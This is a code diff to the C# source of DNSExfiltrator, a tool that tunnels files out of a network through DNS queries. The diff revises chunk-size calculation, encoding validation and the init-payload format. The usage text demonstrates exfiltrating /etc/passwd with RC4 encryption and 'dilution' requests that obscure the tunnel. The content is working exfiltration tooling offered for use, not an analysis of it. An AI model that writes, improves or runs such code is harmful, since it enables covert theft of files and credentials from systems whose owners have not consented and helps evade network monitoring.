@@ -27,7 +27,7 @@ namespace DNSExfiltrator
 
         private static void PrintUsage()
         {
-            Console.WriteLine("Usage: mono DNSExfiltrator.exe <file> <domain> <password> [options]");
+            Console.WriteLine("Usage: mono DNSExfiltrator.exe <file> <domain file> <password> [options]");
             Console.WriteLine("");
             Console.WriteLine("Options:");
             Console.WriteLine("  s=<server>    DNS server IP address");
@@ -40,7 +40,7 @@ namespace DNSExfiltrator
             Console.WriteLine("  dil=<count>  Number of dilution requests sent between two tunneling requests (default: 0)");
             Console.WriteLine("");
             Console.WriteLine("Example:");
-            Console.WriteLine("  mono DNSExfiltrator.exe /etc/passwd test.com pass123 s=127.0.0.1 e=base64 l=20");
+            Console.WriteLine("  mono DNSExfiltrator.exe /etc/passwd domains.txt pass123 s=127.0.0.1 e=base32 l=20");
         }
 
         private static void PrintColor(string text)
@@ -242,7 +242,12 @@ private static string ToHex(byte[] data)
                             labelMaxSize = Convert.ToInt32(arg.Split('=')[1]);
                             if (labelMaxSize < 1 || labelMaxSize > 63) throw new ArgumentException("Label max size must be 1-63");
                         }
-                        else if (arg.StartsWith("e=")) encoding = arg.Split('=')[1];
+                        else if (arg.StartsWith("e="))
+                        {
+                            encoding = arg.Split('=')[1];
+                            if (encoding != "base32" && encoding != "base32map" && encoding != "hex")
+                                throw new ArgumentException("Encoding must be base32, base32map or hex");
+                        }
                         else if (arg.StartsWith("retry="))
                         {
                             maxRetries = Convert.ToInt32(arg.Split('=')[1]);
@@ -324,8 +329,42 @@ private static string ToHex(byte[] data)
                 PrintColor(String.Format("[*] Effective label size (base32map): {0} base32 chars", effectiveLabelSize));
             }
 
-            // INIT with file size (not totalRequests)
-            string initPayload = EncodingToNumber(encoding) + "|" + zipData.Length;
+            // Calculate chunk size in bytes based on encoding (account for encoding overhead).
+            // One byte per chunk stays reserved: the sequence number used to travel inside
+            // the chunk (FIX for B2-ENC-001) and now has its own label; keeping the byte
+            // keeps chunk sizes comparable with earlier runs.
+            int chunkSize;
+            int overheadBytes = 1;
+
+            switch (encoding)
+            {
+                case "hex":
+                    // hex: n bytes -> n * 2 chars
+                    chunkSize = effectiveLabelSize / 2 - overheadBytes;
+                    break;
+                case "base32map":
+                case "base32":
+                    // base32: n bytes -> ceil(n * 8/5) chars. For base32map,
+                    // effectiveLabelSize already counts base32 characters (labelMaxSize / 3),
+                    // each of which becomes a three-letter word.
+                    chunkSize = (effectiveLabelSize * 5) / 8 - overheadBytes;
+                    break;
+                default:
+                    PrintColor("[!] Unsupported encoding: " + encoding);
+                    return;
+            }
+
+            if (chunkSize < 1)
+            {
+                PrintColor(String.Format("[!] Label size {0} is too small for {1}: no room for data", labelMaxSize, encoding));
+                return;
+            }
+            PrintColor(String.Format("[*] Chunk size: {0} bytes per query", chunkSize));
+
+            // INIT: "<encoding>|<file size>|". The trailing '|' marks the end: the
+            // server decodes the init after every part, and without it a prefix such
+            // as "1|303" of "1|3030" would already look complete.
+            string initPayload = EncodingToNumber(encoding) + "|" + zipData.Length + "|";
             string initEnc = ToBase32Map(Encoding.UTF8.GetBytes(initPayload)).ToLower();
 
             PrintColor("[*] Init payload: " + initPayload);
@@ -394,41 +433,6 @@ private static string ToHex(byte[] data)
             // Create RC4 instance for streaming encryption (maintains state)
             RC4 rc4 = new RC4(Encoding.UTF8.GetBytes(password));
 
-            // Calculate chunk size in bytes based on encoding (account for encoding overhead)
-            // FIX for B2-ENC-001: Account for sequence byte that is prepended to each chunk
-            // The chunk will be: [sequence_byte(1) + data_chunk(chunkSize)]
-            int chunkSize;
-            int overheadBytes = 1; // 1 for sequence byte
-            
-            switch (encoding)
-            {
-                case "base64":
-                    // base64: n bytes -> ceil(n * 4/3) chars
-                    // We need: ceil((chunkSize + overheadBytes) * 4/3) <= effectiveLabelSize
-                    chunkSize = (effectiveLabelSize * 3) / 4 - overheadBytes;
-                    if (chunkSize < 0) chunkSize = 0;
-                    break;
-                case "hex":
-                    // hex: n bytes -> n * 2 chars
-                    chunkSize = effectiveLabelSize / 2 - overheadBytes;
-                    if (chunkSize < 0) chunkSize = 0;
-                    break;
-                case "base32map":
-                    // base32map: effectiveLabelSize is the max label chars
-                    // Each base32 char maps to 3 final chars
-                    int maxBase32Chars = effectiveLabelSize / 3;
-                    chunkSize = (maxBase32Chars * 5) / 8 - overheadBytes;
-                    if (chunkSize < 0) chunkSize = 0;
-                    break;
-                case "base32":
-                    chunkSize = (effectiveLabelSize * 5) / 8 - overheadBytes;
-                    if (chunkSize < 0) chunkSize = 0;
-                    break;
-                default:
-                    chunkSize = (effectiveLabelSize * 3) / 4 - overheadBytes;
-                    if (chunkSize < 0) chunkSize = 0;
-                    break;
-            }
 
             // Send data with ACK verification
             int requestsSent = 0;
